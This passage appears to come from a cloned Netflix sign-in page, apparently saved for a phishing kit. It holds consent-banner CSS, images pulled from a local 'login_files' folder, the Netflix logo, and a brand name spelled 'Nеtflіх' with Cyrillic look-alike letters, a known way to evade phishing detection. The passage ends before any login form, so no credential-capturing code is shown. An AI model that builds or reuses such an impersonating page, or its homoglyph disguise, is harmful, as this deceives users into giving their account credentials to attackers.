        #onetrust-pc-sdk #ot-fltr-cntr {
          float: right;
          right: 15px
        }

        #onetrust-pc-sdk #ot-lst-title {
          padding-left: 15px
        }

        #onetrust-pc-sdk #ot-lst-cnt {
          height: auto;
          overflow: auto
        }

        #onetrust-pc-sdk .save-preference-btn-handler,
        #onetrust-pc-sdk #accept-recommended-btn-handler,
        #onetrust-pc-sdk .ot-pc-refuse-all-handler {
          width: calc(100% - 33px)
        }

        #onetrust-pc-sdk.ot-ftr-stacked .save-preference-btn-handler,
        #onetrust-pc-sdk.ot-ftr-stacked .ot-btn-subcntr {
          max-width: none
        }

        #onetrust-pc-sdk.ot-ftr-stacked .ot-pc-footer button {
          margin: 15px
        }

        #onetrust-pc-sdk.ot-ftr-stacked .ot-btn-subcntr button {
          min-width: none;
          max-width: none
        }

        #onetrust-pc-sdk.ot-ftr-stacked .ot-btn-subcntr button:nth-child(2) {
          margin-top: 15px
        }

        #onetrust-pc-sdk.ot-ftr-stacked .ot-btn-container button:not(:last-child) {
          margin-bottom: 0
        }
      }

      @media(max-width: 425px) {
        #onetrust-pc-sdk .ot-pc-header .ot-pc-logo {
          width: 15%
        }

        #onetrust-pc-sdk .ot-pc-header .ot-pc-logo img {
          max-height: fit-content;
          font-size: 10px
        }

        #onetrust-pc-sdk .ot-title-cntr {
          width: 75%
        }

        #onetrust-pc-sdk #ot-pc-lst .ot-acc-txt {
          padding-top: 6px;
          padding-bottom: 10px
        }

        #onetrust-pc-sdk #ot-pc-lst .ot-host-notice {
          float: left;
          margin-left: 30px
        }

        #onetrust-pc-sdk #ot-pc-lst .ot-arw-cntr {
          float: none;
          display: inline
        }

        #onetrust-pc-sdk #ot-pc-lst .ot-ven-hdr {
          float: left;
          width: 100%;
          max-width: 85%
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-pc-lst .ot-acc-cntr .ot-arw-cntr:first-of-type {
          float: right
        }

        #onetrust-pc-sdk #ot-pc-title {
          max-width: 100%;
          white-space: break-spaces;
          font-size: 20px;
          overflow-x: visible
        }

        #onetrust-pc-sdk .ot-subgrp-cntr li.ot-subgrp {
          margin-left: 10px;
          width: calc(100% - 10px)
        }

        #onetrust-pc-sdk #ot-ven-lst .ot-tgl-cntr {
          width: auto;
          float: right
        }

        #onetrust-pc-sdk #ot-ven-lst .ot-arw-cntr {
          float: right
        }

        #onetrust-pc-sdk .ot-ven-hdr {
          max-width: 47%
        }

        #onetrust-pc-sdk .ot-always-active-group .ot-tgl-cntr:first-of-type {
          max-width: none;
          padding-left: 20px
        }
      }

      @media only screen and (max-height: 425px)and (max-width: 896px)and (orientation: landscape) {
        #onetrust-pc-sdk {
          height: 100%;
          width: 100%;
          max-width: none
        }

        #onetrust-pc-sdk .ot-always-active-group .ot-tgl-cntr {
          max-width: none
        }

        #onetrust-pc-sdk .ot-pc-header {
          padding: 10px;
          width: calc(100% - 20px);
          height: auto;
          min-height: 20px
        }

        #onetrust-pc-sdk .ot-pc-header .ot-pc-logo {
          max-height: 20px;
          width: 15%
        }

        #onetrust-pc-sdk .ot-pc-header .ot-pc-logo img {
          max-height: fit-content;
          font-size: 10px
        }

        #onetrust-pc-sdk .ot-title-cntr {
          width: 75%
        }

        #onetrust-pc-sdk .ot-title-cntr #ot-pc-title {
          white-space: break-spaces;
          font-size: 20px;
          overflow-x: visible
        }

        #onetrust-pc-sdk .ot-pc-footer {
          max-height: 52px;
          overflow-y: auto
        }

        #onetrust-pc-sdk #ot-pc-lst {
          overflow-y: auto
        }

        #onetrust-pc-sdk #ot-pc-lst #ot-pc-hdr {
          height: auto
        }

        #onetrust-pc-sdk #ot-pc-lst #ot-pc-hdr #ot-pc-title {
          max-height: 20px
        }

        #onetrust-pc-sdk #ot-pc-lst #ot-pc-hdr .ot-lst-subhdr {
          padding: 10px 5px;
          float: none
        }

        #onetrust-pc-sdk #ot-pc-lst #ot-pc-hdr .ot-lst-subhdr #ot-fltr-cntr {
          margin-top: 5px
        }

        #onetrust-pc-sdk #ot-pc-lst #ot-lst-cnt {
          overflow: visible
        }

        #onetrust-pc-sdk #ot-lst-cnt {
          height: auto;
          overflow: auto
        }

        #onetrust-pc-sdk #accept-recommended-btn-handler {
          float: right
        }

        #onetrust-pc-sdk .save-preference-btn-handler,
        #onetrust-pc-sdk #accept-recommended-btn-handler,
        #onetrust-pc-sdk .ot-pc-refuse-all-handler {
          width: auto
        }

        #onetrust-pc-sdk.ot-ftr-stacked #accept-recommended-btn-handler,
        #onetrust-pc-sdk.ot-ftr-stacked .ot-pc-refuse-all-handler {
          width: 90%
        }

        #onetrust-pc-sdk #ot-pc-content,
        #onetrust-pc-sdk #ot-pc-lst {
          height: calc(100% - 120px)
        }

        #onetrust-pc-sdk.ot-shw-fltr .ot-lst-cntr {
          overflow: hidden
        }

        #onetrust-pc-sdk.ot-shw-fltr #ot-pc-lst {
          position: static
        }

        #onetrust-pc-sdk.ot-shw-fltr #ot-fltr-modal {
          top: 0;
          width: 100%;
          height: 100%;
          max-height: none
        }

        #onetrust-pc-sdk.ot-shw-fltr #ot-fltr-modal>div {
          margin: 0;
          box-sizing: initial;
          height: 100%;
          max-height: none
        }

        #onetrust-pc-sdk.ot-shw-fltr #clear-filters-handler {
          padding-right: 20px
        }

        #onetrust-pc-sdk.ot-shw-fltr #ot-anchor {
          display: none !important
        }

        #onetrust-pc-sdk .ot-pc-footer button {
          margin: 10px
        }
      }

      @media(max-width: 425px),
      (max-width: 896px)and (max-height: 425px)and (orientation: landscape) {
        #onetrust-pc-sdk .ot-pc-header {
          padding-right: 20px
        }

        #onetrust-pc-sdk .ot-pc-logo {
          margin-left: 0px;
          margin-top: 5px;
          width: 150px
        }

        #onetrust-pc-sdk .ot-close-icon {
          width: 44px;
          height: 44px;
          background-size: 12px
        }

        #onetrust-pc-sdk .ot-grp-hdr1 {
          float: right;
          padding-right: 10px
        }

        #onetrust-pc-sdk .ot-grp-hdr1+.ot-vlst-cntr {
          padding-top: 10px
        }
      }

      @media only screen and (max-height: 610px) {
        #onetrust-pc-sdk {
          max-height: 100%
        }
      }

      @media(max-width: 425px)and (orientation: landscape) {
        #onetrust-pc-sdk .ot-pc-header #ot-pc-title {
          font-size: 10px
        }
      }

      #onetrust-consent-sdk #onetrust-pc-sdk,
      #onetrust-consent-sdk #ot-search-cntr,
      #onetrust-consent-sdk #onetrust-pc-sdk .ot-switch.ot-toggle,
      #onetrust-consent-sdk #onetrust-pc-sdk ot-grp-hdr1 .checkbox,
      #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-title:after,
      #onetrust-consent-sdk #onetrust-pc-sdk #ot-sel-blk,
      #onetrust-consent-sdk #onetrust-pc-sdk #ot-fltr-cnt,
      #onetrust-consent-sdk #onetrust-pc-sdk #ot-anchor {
        background-color: #FFFFFF;
      }

      #onetrust-consent-sdk #onetrust-pc-sdk h3,
      #onetrust-consent-sdk #onetrust-pc-sdk h4,
      #onetrust-consent-sdk #onetrust-pc-sdk h5,
      #onetrust-consent-sdk #onetrust-pc-sdk h6,
      #onetrust-consent-sdk #onetrust-pc-sdk p,
      #onetrust-consent-sdk #onetrust-pc-sdk #ot-ven-lst .ot-ven-opts p,
      #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-desc,
      #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-title,
      #onetrust-consent-sdk #onetrust-pc-sdk .ot-li-title,
      #onetrust-consent-sdk #onetrust-pc-sdk .ot-sel-all-hdr span,
      #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-info,
      #onetrust-consent-sdk #onetrust-pc-sdk #ot-fltr-modal #modal-header,
      #onetrust-consent-sdk #onetrust-pc-sdk .ot-checkbox label span,
      #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst #ot-sel-blk p,
      #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst #ot-lst-title h3,
      #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst .back-btn-handler p,
      #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst .ot-ven-name,
      #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst #ot-ven-lst .consent-category,
      #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-inactive-leg-btn,
      #onetrust-consent-sdk #onetrust-pc-sdk .ot-label-status,
      #onetrust-consent-sdk #onetrust-pc-sdk .ot-chkbox label span,
      #onetrust-consent-sdk #onetrust-pc-sdk #clear-filters-handler,
      #onetrust-consent-sdk #onetrust-pc-sdk .ot-optout-signal {
        color: #333333;
      }

      #onetrust-consent-sdk #onetrust-pc-sdk .privacy-notice-link,
      #onetrust-consent-sdk #onetrust-pc-sdk .ot-pgph-link,
      #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler,
      #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler+a,
      #onetrust-consent-sdk #onetrust-pc-sdk .category-host-list-handler,
      #onetrust-consent-sdk #onetrust-pc-sdk .ot-ven-link,
      #onetrust-consent-sdk #onetrust-pc-sdk .ot-ven-legclaim-link,
      #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-name a,
      #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-acc-hdr .ot-host-expand,
      #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-info a,
      #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-content #ot-pc-desc .ot-link-btn,
      #onetrust-consent-sdk #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-vnd-info a,
      #onetrust-consent-sdk #onetrust-pc-sdk #ot-lst-cnt .ot-vnd-info a {
        color: #3860BE;
      }

      #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler:hover {
        text-decoration: underline;
      }

      #onetrust-consent-sdk #onetrust-pc-sdk .ot-acc-grpcntr.ot-acc-txt,
      #onetrust-consent-sdk #onetrust-pc-sdk .ot-acc-txt .ot-subgrp-tgl .ot-switch.ot-toggle {
        background-color: #F8F8F8;
      }

      #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-info,
      #onetrust-consent-sdk #onetrust-pc-sdk .ot-acc-txt .ot-ven-dets {
        background-color: #F8F8F8;
      }

      #onetrust-consent-sdk #onetrust-pc-sdk button:not(#clear-filters-handler):not(.ot-close-icon):not(#filter-btn-handler):not(.ot-remove-objection-handler):not(.ot-obj-leg-btn-handler):not([aria-expanded]):not(.ot-link-btn),
      #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-active-leg-btn {
        background-color: #e50914;
        border-color: #e50914;
        color: #FFFFFF;
      }

      #onetrust-consent-sdk #onetrust-pc-sdk .ot-active-menu {
        border-color: #e50914;
      }

      #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-remove-objection-handler {
        background-color: transparent;
        border: 1px solid transparent;
      }

      #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-inactive-leg-btn {
        background-color: #FFFFFF;
        color: #78808E;
        border-color: #78808E;
      }

      #onetrust-consent-sdk #onetrust-pc-sdk .ot-tgl input:focus+.ot-switch,
      .ot-switch .ot-switch-nob,
      .ot-switch .ot-switch-nob:before,
      #onetrust-pc-sdk .ot-checkbox input[type="checkbox"]:focus+label::before,
      #onetrust-pc-sdk .ot-chkbox input[type="checkbox"]:focus+label::before {
        outline-color: #696969;
        outline-width: 1px;
      }

      #onetrust-pc-sdk .ot-host-item>button:focus,
      #onetrust-pc-sdk .ot-ven-item>button:focus {
        border: 1px solid #696969;
      }

      #onetrust-consent-sdk #onetrust-pc-sdk *:focus,
      #onetrust-consent-sdk #onetrust-pc-sdk .ot-vlst-cntr>a:focus {
        outline: 1px solid #696969;
      }

      #onetrust-consent-sdk #onetrust-pc-sdk .category-menu-switch-handler {
        background-color: #F4F4F4
      }

      #onetrust-consent-sdk #onetrust-pc-sdk .ot-active-menu {
        background-color: #FFFFFF
      }

      #onetrust-consent-sdk #onetrust-pc-sdk .category-menu-switch-handler {
        background-color: #F4F4F4
      }

      #onetrust-consent-sdk #onetrust-pc-sdk .ot-active-menu {
        background-color: #FFFFFF
      }

      #onetrust-pc-sdk .ot-vlst-cntr .ot-ext-lnk,
      #onetrust-pc-sdk .ot-ven-hdr .ot-ext-lnk {
        background-image: url('https://help.nflxext.com/helpcenter/OneTrust/oneTrust_production/consent/87b6a5c0-0104-4e96-a291-092c11350111/01938dc4-59b3-7bbc-b635-c4131030e85f/logos/static/ot_external_link.svg');
      }

      /* Round button shape */
      #onetrust-button-group {
        border-radius: 0.25rem;
      }

      /* Customize cookie details for Essential (C0001) and Performance (C0002)*/
      #onetrust-pc-sdk div#ot-desc-id-C0002 .category-host-list-handler {
        display: none;
      }

      #onetrust-pc-sdk div#ot-desc-id-C0001 .category-host-list-handler {
        display: none;
      }

      /* Customize Always Active Display*/
      #onetrust-pc-sdk .ot-always-active {
        display: none;
      }

      /* Customizations for cookie selection filter and search */
      #onetrust-pc-sdk #vendors-list-header input {
        display: none !important;
      }

      #onetrust-pc-sdk #ot-search-cntr {
        display: none !important;
      }

      #onetrust-pc-sdk #ot-fltr-cntr {
        display: none !important;
      }

      .ot-sdk-cookie-policy {
        font-family: inherit;
        font-size: 16px
      }

      .ot-sdk-cookie-policy.otRelFont {
        font-size: 1rem
      }

      .ot-sdk-cookie-policy h3,
      .ot-sdk-cookie-policy h4,
      .ot-sdk-cookie-policy h6,
      .ot-sdk-cookie-policy p,
      .ot-sdk-cookie-policy li,
      .ot-sdk-cookie-policy a,
      .ot-sdk-cookie-policy th,
      .ot-sdk-cookie-policy #cookie-policy-description,
      .ot-sdk-cookie-policy .ot-sdk-cookie-policy-group,
      .ot-sdk-cookie-policy #cookie-policy-title {
        color: dimgray
      }

      .ot-sdk-cookie-policy #cookie-policy-description {
        margin-bottom: 1em
      }

      .ot-sdk-cookie-policy h4 {
        font-size: 1.2em
      }

      .ot-sdk-cookie-policy h6 {
        font-size: 1em;
        margin-top: 2em
      }

      .ot-sdk-cookie-policy th {
        min-width: 75px
      }

      .ot-sdk-cookie-policy a,
      .ot-sdk-cookie-policy a:hover {
        background: #fff
      }

      .ot-sdk-cookie-policy thead {
        background-color: #f6f6f4;
        font-weight: bold
      }

      .ot-sdk-cookie-policy .ot-mobile-border {
        display: none
      }

      .ot-sdk-cookie-policy section {
        margin-bottom: 2em
      }

      .ot-sdk-cookie-policy table {
        border-collapse: inherit
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy {
        font-family: inherit;
        font-size: 1rem
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h3,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h4,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h6,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy p,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-title {
        color: dimgray
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description {
        margin-bottom: 1em
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup {
        margin-left: 1.5em
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group-desc,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-table-header,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy span,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td {
        font-size: .9em
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td span,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td a {
        font-size: inherit
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group {
        font-size: 1em;
        margin-bottom: .6em
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-title {
        margin-bottom: 1.2em
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy>section {
        margin-bottom: 1em
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th {
        min-width: 75px
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a:hover {
        background: #fff
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead {
        background-color: #f6f6f4;
        font-weight: bold
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-mobile-border {
        display: none
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy section {
        margin-bottom: 2em
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup ul li {
        list-style: disc;
        margin-left: 1.5em
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup ul li h4 {
        display: inline-block
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table {
        border-collapse: inherit;
        margin: auto;
        border: 1px solid #d7d7d7;
        border-radius: 5px;
        border-spacing: initial;
        width: 100%;
        overflow: hidden
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table th,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table td {
        border-bottom: 1px solid #d7d7d7;
        border-right: 1px solid #d7d7d7
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td {
        border-bottom: 0px
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr th:last-child,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr td:last-child {
        border-right: 0px
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-host,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-cookies-type {
        width: 25%
      }

      .ot-sdk-cookie-policy[dir=rtl] {
        text-align: left
      }

      #ot-sdk-cookie-policy h3 {
        font-size: 1.5em
      }

      @media only screen and (max-width: 530px) {

        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) table,
        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) thead,
        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tbody,
        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) th,
        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td,
        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr {
          display: block
        }

        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) thead tr {
          position: absolute;
          top: -9999px;
          left: -9999px
        }

        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr {
          margin: 0 0 1em 0
        }

        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr:nth-child(odd),
        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr:nth-child(odd) a {
          background: #f6f6f4
        }

        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td {
          border: none;
          border-bottom: 1px solid #eee;
          position: relative;
          padding-left: 50%
        }

        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td:before {
          position: absolute;
          height: 100%;
          left: 6px;
          width: 40%;
          padding-right: 10px
        }

        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) .ot-mobile-border {
          display: inline-block;
          background-color: #e4e4e4;
          position: absolute;
          height: 100%;
          top: 0;
          left: 45%;
          width: 2px
        }

        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td:before {
          content: attr(data-label);
          font-weight: bold
        }

        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) li {
          word-break: break-word;
          word-wrap: break-word
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table {
          overflow: hidden
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table td {
          border: none;
          border-bottom: 1px solid #d7d7d7
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tbody,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tr {
          display: block
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-host,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-cookies-type {
          width: auto
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tr {
          margin: 0 0 1em 0
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td:before {
          height: 100%;
          width: 40%;
          padding-right: 10px
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td:before {
          content: attr(data-label);
          font-weight: bold
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li {
          word-break: break-word;
          word-wrap: break-word
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead tr {
          position: absolute;
          top: -9999px;
          left: -9999px;
          z-index: -9999
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td {
          border-bottom: 1px solid #d7d7d7;
          border-right: 0px
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td:last-child {
          border-bottom: 0px
        }
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h5,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h6,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy p,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy span,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description {
        color: #696969;
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th {
        color: #696969;
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group {
        color: #696969;
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-title {
        color: #696969;
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table th {
        background-color: #F8F8F8;
      }

      .ot-floating-button__front {
        background-image: url('https://help.nflxext.com/helpcenter/OneTrust/oneTrust_production/consent/87b6a5c0-0104-4e96-a291-092c11350111/01938dc4-59b3-7bbc-b635-c4131030e85f/logos/static/ot_persistent_cookie_icon.png')
      }
	  
	  
	  
	  
    </style>
  </head>
  <body>
    <div id="appMountPoint">
      <div>
        <div data-uia="loc" lang="en-TN" dir="ltr">
          <div class="default-ltr-cache-k55181 eoi9e9o1">
            <div class="default-ltr-cache-pkc5fh e1qiesvj0">
<img class="concord-img vlv-creative" 
     src="./login_files/TN-en-20250127-TRIFECTA-perspective_b4f5f0f3-bb55-47f9-95ab-8816601c60ab_small.jpg" 
     srcset="./login_files/TN-en-20250127-TRIFECTA-perspective_b4f5f0f3-bb55-47f9-95ab-8816601c60ab_small.jpg 1000w, 
             ./login_files/TN-en-20250127-TRIFECTA-perspective_b4f5f0f3-bb55-47f9-95ab-8816601c60ab_medium.jpg 1500w, 
             ./login_files/TN-en-20250127-TRIFECTA-perspective_b4f5f0f3-bb55-47f9-95ab-8816601c60ab_large.jpg 1800w" 
     alt="">
            </div>
            <header>
              <header class=" default-ltr-cache-xa9oq4 e1bzn5xj0">
                <div data-layout="wrapper" class="layout-container_wrapperStyles__12wd1go1d  default-ltr-cache-1u8qly9" dir="ltr">
                  <div data-layout="container" class="layout-container_styles__12wd1go1g" dir="ltr" style="--_12wd1go0: center; --_12wd1go9: 0.5rem; --_12wd1goh: 0.5rem; --_12wd1gop: 1rem; --_12wd1gox: 1rem; --_12wd1go15: 1rem; --_12wd1go2: row; --_12wd1go3: space-between; --_12wd1go5: 0px; --_12wd1go6: 0.5rem; --_12wd1gof: calc(100% + 0.5rem); --_12wd1gon: calc(100% + 0.5rem); --_12wd1gov: calc(100% + 1rem); --_12wd1go13: calc(100% + 1rem); --_12wd1go1b: calc(100% + 1rem);">
                    <div data-layout="item" class="layout-item_styles__zc08zp30  default-ltr-cache-1u8qly9" dir="ltr" style="--zc08zpi: auto; --zc08zp10: auto; --zc08zpy: 0 auto; --zc08zp1g: 0 auto; --zc08zp1y: 0 0 calc(33.333333333333336% - 1rem); --zc08zp2g: 0 0 calc(33.333333333333336% - 1rem); --zc08zp2y: 0 0 calc(33.333333333333336% - 1rem); --zc08zp7: 0px;">
                      <a class="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0 default-ltr-cache-0 ev1dnif0" dir="ltr" role="link" href="#">
                        <svg viewBox="0 0 111 30" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="default-ltr-cache-1d568uk ev1dnif2">
                          <g>
                            <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"></path>
                          </g>
                        </svg>
                        <span class="default-ltr-cache-raue2m ev1dnif1">Nеtflіх</span>
                      </a>
                    </div>
                    <div data-layout="item" class="layout-item_styles__zc08zp30  default-ltr-cache-1u8qly9" dir="ltr" style="--zc08zpi: auto; --zc08zp10: auto; --zc08zpy: 0 auto; --zc08zp1g: 0 auto; --zc08zp1y: 0 0 calc(66.66666666666667% - 1rem); --zc08zp2g: 0 0 calc(66.66666666666667% - 1rem); --zc08zp2y: 0 0 calc(66.66666666666667% - 1rem); --zc08zpc: flex-end; --zc08zp7: 0px;">
                      <div data-layout="wrapper" class="layout-container_wrapperStyles__12wd1go1d  default-ltr-cache-1u8qly9" dir="ltr">
                        <div data-layout="container" class="layout-container_styles__12wd1go1g" dir="ltr" style="--_12wd1go9: 0.5rem; --_12wd1goh: 0.5rem; --_12wd1gop: 1.5rem; --_12wd1gox: 1.5rem; --_12wd1go15: 1.5rem; --_12wd1go2: row; --_12wd1go3: flex-end; --_12wd1go5: 0px; --_12wd1go6: 0px; --_12wd1gof: calc(100% + 0.5rem); --_12wd1gon: calc(100% + 0.5rem); --_12wd1gov: calc(100% + 1.5rem); --_12wd1go13: calc(100% + 1.5rem); --_12wd1go1b: calc(100% + 1.5rem);">
                          <div data-layout="item" class="layout-item_styles__zc08zp30  default-ltr-cache-1u8qly9" dir="ltr" style="--zc08zp0: auto; --zc08zpg: 0 auto; --zc08zp7: 0px;"></div>
                        </div>
                      </div>
                    </div>
                  </div>
